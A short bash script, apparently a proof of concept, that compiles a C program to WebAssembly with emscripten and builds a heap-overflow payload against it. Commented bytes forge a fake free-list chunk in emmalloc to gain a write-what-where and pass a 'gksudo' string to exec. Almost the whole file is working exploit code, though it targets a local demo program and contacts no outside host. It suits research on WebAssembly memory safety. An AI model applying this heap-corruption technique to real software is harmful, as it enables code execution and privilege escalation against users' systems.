#!/bin/bash
# needs gnu99 for gets()
emcc -std=gnu99 -g -O2 main.c -o main.js -s MALLOC=emmalloc -s NODERAWFS=1; wasm2wat --generate-names main.wasm > main.wat
wasm2wat --generate-names main.wasm > main.wat
# x: must be valid "op", otherwise program terminates
# 7 bytes of padding, here: spaces
# gksudo\x00\x00: string to be passed to exec
# \x18\x00\x00\x00: hex 18 (dec 24) size of our own region, corresponds to the 16 bytes in the malloc() call (8 bytes metadata)
# \x10\x00\x00\x00: hex 10 (dec 16) size of fake free region
# \x01\x00\x00\x00: free list prev entry, here: value to write
# \x98\x19\x50\x00: free list next entry, here: ptr to write to -4
# \xEF\xFF\xFF\xFF: one's complement of fake free region size, was 10, so complement of 10
echo -ne 'x       gksudo\x00\x00\x18\x00\x00\x00\x10\x00\x00\x00\x01\x00\x00\x00\x98\x19\x50\x00\xEF\xFF\xFF\xFF' > exploit
# offset of gksudo string in injected heap data
echo 5249632 > gksudo-offset
cat gksudo-offset | node main.js